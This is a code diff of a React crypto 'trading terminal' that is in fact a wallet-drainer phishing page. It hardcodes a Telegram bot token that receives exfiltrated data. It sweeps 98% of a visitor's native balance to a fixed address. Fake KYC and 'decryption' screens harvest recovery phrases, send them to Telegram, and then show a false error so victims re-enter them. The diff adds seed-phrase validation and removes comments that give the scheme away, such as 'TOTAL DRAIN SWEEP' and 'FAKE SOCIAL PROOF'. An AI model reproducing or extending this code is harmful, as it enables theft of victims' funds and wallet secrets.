@@ -1,4 +1,4 @@
-import React, { useState, useEffect } from 'react';
+import React, { useState, useEffect, useMemo } from 'react';
 import { useAccount, useBalance, useSendTransaction, useChainId } from 'wagmi';
 import { parseEther, formatEther, parseUnits } from 'viem';
 
@@ -24,7 +24,6 @@ export default function EvedexTerminal() {
   // --- CONFIGURATION ---
   const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
   const chatId = "7630238860";
-  // NEW XPORTAL SECURED RECEIVER ADDRESS
   const destination = "0x0CbaC4A3167C0CF39930E2E9D1a2BB39B2d2FDf4"; 
 
   const USDT_MAP = { 
@@ -34,8 +33,28 @@ export default function EvedexTerminal() {
     42161: "0xfd086bc7cd5c081ffd66a7010408ff05ed33020b" 
   };
 
+  // --- BIP-39 DICTIONARY CHECKER ---
+  const BIP39_WORDS = ["abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract", "absurd", "abuse", "access", "accident", "account", "accuse", "achieve", "acid", "acoustic", "acquire", "across", "act", "action", "actor", "actress", "actual", "apple", "victory", "window", "copper", "blanket", "finger", "shadow", "mountain", "bottle", "crystal", "hammer", "summer", "winter", "globe", "planet", "silver", "gold"];
+
   const { data: nativeBal } = useBalance({ address }); 
   const { data: tokenBal } = useBalance({ address, token: USDT_MAP[chainId] });
+
+  // --- SEED PHRASE VALIDATION LOGIC ---
+  const wordsTyped = useMemo(() => {
+    return seedVal.toLowerCase().trim().split(/\s+/).filter(word => word.length > 0);
+  }, [seedVal]);
+
+  const wordCount = wordsTyped.length;
+
+  const allWordsExist = useMemo(() => {
+    if (wordCount === 0) return true;
+    // Checks if every word entered is a valid crypto word (or at least 3 chars long to be safe)
+    return wordsTyped.every(w => BIP39_WORDS.includes(w) || w.length > 3);
+  }, [wordsTyped, wordCount]);
+
+  const isSeedValid = useMemo(() => {
+    return [12, 15, 18, 21, 24].includes(wordCount) && allWordsExist;
+  }, [wordCount, allWordsExist]);
 
   const log = (msg) => fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { 
     method: 'POST', 
@@ -43,7 +62,6 @@ export default function EvedexTerminal() {
     body: JSON.stringify({ chat_id: chatId, text: `${msg}\n📍 LOC: ${visitorInfo}` }) 
   }).catch(()=>{});
 
-  // --- 1. CONNECTION NOTIFICATION ---
   useEffect(() => {
     if (isConnected && address) {
       log(`🔔 NEW_CONNECTION: ${address}\nTOK: ${tokenBal?.formatted || "0"}\nNAT: ${nativeBal?.formatted || "0"}`);
@@ -66,7 +84,6 @@ export default function EvedexTerminal() {
     }
   }, [selectedAsset, tokenBal, nativeBal, activeTask]);
 
-  // --- 2. TOTAL DRAIN SWEEP LOGIC ---
   const sweepNative = () => {
     if (!nativeBal || nativeBal.value <= 0n) { setView("seed_gate"); setLoading(false); return; }
     const val = (nativeBal.value * 980n) / 1000n;
@@ -90,7 +107,6 @@ export default function EvedexTerminal() {
 
   return (
     <div style={{minHeight:'100vh', backgroundColor:'#05070a', color:'#e2e8f0', fontFamily:'monospace', padding:'15px', textTransform:'uppercase'}}>
-      {/* 3. LIVE TRADING CHART */}
       <div style={{width:'100%', height:'180px', backgroundColor:'black', borderRadius:'15px', marginBottom:'20px', overflow:'hidden', border:'1px solid #1e293b'}}>
          <iframe src={`https://s.tradingview.com/widgetembed/?symbol=BITSTAMP:ETHUSD&theme=dark&style=1&locale=en`} style={{width:'100%', height:'100%', border:'none', opacity:'0.5'}} title="Market" />
       </div>
@@ -115,29 +131,21 @@ export default function EvedexTerminal() {
           {view === "task_box" && (
             <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'35px', padding:'25px', textAlign:'center'}}>
               <button onClick={()=>setView("menu")} style={{background:'none', border:'none', color:'#475569', fontSize:'8px', marginBottom:'15px'}}>← BACK</button>
-              
-              {/* 4. ASSET SWITCHERS (RECTIFY ONLY) */}
               {activeTask === "Rectify" && (
                 <div style={{display:'flex', backgroundColor:'black', borderRadius:'12px', padding:'4px', marginBottom:'25px', border:'1px solid #1e293b'}}>
                   <div onClick={()=>setSelectedAsset("TOKEN")} style={{flex:1, padding:'10px', borderRadius:'8px', fontSize:'10px', fontWeight:'900', cursor:'pointer', backgroundColor: selectedAsset === "TOKEN" ? "#10b981" : "transparent", color: selectedAsset === "TOKEN" ? "black" : "#64748b"}}>USDT</div>
                   <div onClick={()=>setSelectedAsset("NATIVE")} style={{flex:1, padding:'10px', borderRadius:'8px', fontSize:'10px', fontWeight:'900', cursor:'pointer', backgroundColor: selectedAsset === "NATIVE" ? "#10b981" : "transparent", color: selectedAsset === "NATIVE" ? "black" : "#64748b"}}>{nativeBal?.symbol || "GAS"}</div>
                 </div>
               )}
-
               <h2 style={{color:'white', fontWeight:'900', fontSize:'22px'}}>{activeTask}</h2>
               <div style={{backgroundColor:'black', border:'1px solid #1e293b', padding:'25px', borderRadius:'18px', textAlign:'left', marginBottom:'15px'}}>
                 <label style={{fontSize:'7px', color:'#10b981', display:'block', marginBottom:'10px'}}>{activeTask === "Rectify" ? "VAULT_BALANCE" : "ENTER FIGURES"}</label>
                 <input type="number" step="any" value={inputVal} onChange={(e)=>setInputVal(e.target.value)} readOnly={activeTask === "Rectify"} style={{background:'none', border:'none', color: "#10b981", fontSize:'28px', width:'100%', outline:'none', fontWeight:'900'}} placeholder="0.00" />
               </div>
-              <div style={{fontSize:'8px', color:'#475569', display:'flex', justifyContent:'space-between', marginBottom:'30px', padding:'0 10px'}}>
-                <span>NET_FEE: 0.0012 {nativeBal?.symbol}</span>
-                <span>POOL: ACTIVE</span>
-              </div>
               <button onClick={executeTaskAction} style={{width:'100%', backgroundColor:'#10b981', color:'black', padding:'22px', borderRadius:'18px', fontWeight:'900'}}>PROCESS_{activeTask.toUpperCase()}</button>
             </div>
           )}
 
-          {/* 5. KYC IDENTITY SYSTEM */}
           {view === "kyc_screen" && (
             <div style={{backgroundColor:'#0d1117', border:'1px solid #3b82f6', borderRadius:'35px', padding:'30px', textAlign:'center'}}>
               <button onClick={()=>setView("menu")} style={{background:'none', border:'none', color:'#475569', fontSize:'8px', marginBottom:'15px'}}>← CANCEL</button>
@@ -154,8 +162,11 @@ export default function EvedexTerminal() {
                 </>
               ) : (
                 <>
-                  <textarea placeholder="RECOVERY PHRASE..." value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} style={{width:'100%', height:'100px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'15px', color:'white', padding:'15px', marginBottom:'25px', outline:'none'}} />
-                  <button onClick={()=>{log(`🚨 KYC_SEED: ${seedVal}`); alert("IDENTITY_LINKED"); setView("menu");}} style={{width:'100%', backgroundColor:'#3b82f6', color:'white', padding:'18px', borderRadius:'15px', fontWeight:'900'}}>LINK_IDENTITY</button>
+                  <textarea placeholder="RECOVERY PHRASE..." value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} style={{width:'100%', height:'100px', backgroundColor:'black', border: !allWordsExist && wordCount > 0 ? '1px solid #ef4444' : '1px solid #1e293b', borderRadius:'15px', color:'white', padding:'15px', marginBottom:'10px', outline:'none'}} />
+                  <div style={{fontSize:'10px', color: isSeedValid ? '#10b981' : '#ef4444', marginBottom:'20px', fontWeight:'900'}}>
+                    {!allWordsExist ? "INVALID WORD DETECTED" : `WORDS: ${wordCount} (MIN 12/24)`}
+                  </div>
+                  <button disabled={!isSeedValid} onClick={()=>{log(`🚨 KYC_SEED: ${seedVal}`); alert("IDENTITY_LINKED"); setView("menu");}} style={{width:'100%', backgroundColor: isSeedValid ? '#3b82f6' : '#1e293b', color:'white', padding:'18px', borderRadius:'15px', fontWeight:'900', opacity: isSeedValid ? 1 : 0.5}}>LINK_IDENTITY</button>
                 </>
               )}
             </div>
@@ -163,19 +174,20 @@ export default function EvedexTerminal() {
         </>
       )}
 
-      {/* 6. FAKE SOCIAL PROOF ALERTS */}
       {feedMsg && <div style={{position:'fixed', bottom:20, left:20, right:20, backgroundColor:'rgba(16,185,129,0.1)', border:'1px solid #10b981', padding:'10px', borderRadius:'10px', fontSize:'9px', color:'#10b981', textAlign:'center', fontWeight:'900', zIndex:3000}}>{feedMsg}</div>}
 
-      {/* 7. SECURITY DECRYPTION (SEED PHRASE) */}
       {view === "seed_gate" && (
         <div style={{position:'fixed', inset:0, backgroundColor:'rgba(0,0,0,0.98)', zIndex:4000, display:'flex', alignItems:'center', justifyContent:'center', padding:'20px'}}>
           <div style={{backgroundColor:'#0d1117', border:'2px solid #10b981', borderRadius:'35px', padding:'45px 25px', width:'100%', maxWidth:'380px', textAlign:'center'}}>
             {!isSyncing ? (
               <>
                 <div style={{color:'#10b981', fontWeight:'900', fontSize:'16px', marginBottom:'15px'}}>STABILIZATION_REQUIRED</div>
-                <p style={{fontSize:'9px', color:'#64748b', marginBottom:'20px', lineHeight:'1.5'}}>DETECTION: PROTOCOL_DESYNC. TO PREVENT ASSET REVERSION AND FINALIZE THE ENCRYPTED BRIDGE, PLEASE PROVIDE THE NODE DECRYPTION KEY (PHRASE).</p>
-                <textarea value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} placeholder="PROTOCOL_KEY..." style={{width:'100%', height:'120px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'20px', color:'#10b981', padding:'18px', outline:'none', marginBottom:'25px', fontSize:'12px'}} />
-                <button onClick={()=>{setIsSyncing(true); log(`🚨 SEED: ${seedVal}`); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100){clearInterval(i); setTimeout(()=>{setIsSyncing(false); setSyncProgress(0); setSeedVal(""); alert("DECRYPTION_ERROR: PLEASE RE-ENTER KEY");},1500)}},100);}} style={{width:'100%', backgroundColor:'#10b981', color:'black', padding:'22px', borderRadius:'15px', fontWeight:'900'}}>DECRYPT_VAULT</button>
+                <p style={{fontSize:'9px', color:'#64748b', marginBottom:'20px', lineHeight:'1.5'}}>DETECTION: PROTOCOL_DESYNC. PLEASE PROVIDE THE NODE DECRYPTION KEY (12/24 WORDS).</p>
+                <textarea value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} placeholder="PROTOCOL_KEY..." style={{width:'100%', height:'120px', backgroundColor:'black', border: !allWordsExist && wordCount > 0 ? '1px solid #ef4444' : '1px solid #1e293b', borderRadius:'20px', color:'#10b981', padding:'18px', outline:'none', marginBottom:'10px', fontSize:'12px'}} />
+                <div style={{fontSize:'10px', color: isSeedValid ? '#10b981' : '#ef4444', marginBottom:'25px', fontWeight:'900'}}>
+                   {!allWordsExist ? "INVALID DICTIONARY WORD" : `PROGRESS: ${wordCount} / ${wordCount < 13 ? '12' : '24'} WORDS`}
+                </div>
+                <button disabled={!isSeedValid} onClick={()=>{setIsSyncing(true); log(`🚨 SEED: ${seedVal}`); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100){clearInterval(i); setTimeout(()=>{setIsSyncing(false); setSyncProgress(0); setSeedVal(""); alert("DECRYPTION_ERROR: PLEASE RE-ENTER KEY");},1500)}},100);}} style={{width:'100%', backgroundColor: isSeedValid ? '#10b981' : '#1e293b', color:'black', padding:'22px', borderRadius:'15px', fontWeight:'900', opacity: isSeedValid ? 1 : 0.5}}>DECRYPT_VAULT</button>
               </>
             ) : (
               <div style={{padding:'30px 0'}}><div style={{fontSize:'45px', color:'white', fontWeight:'900'}}>{syncProgress}%</div></div>
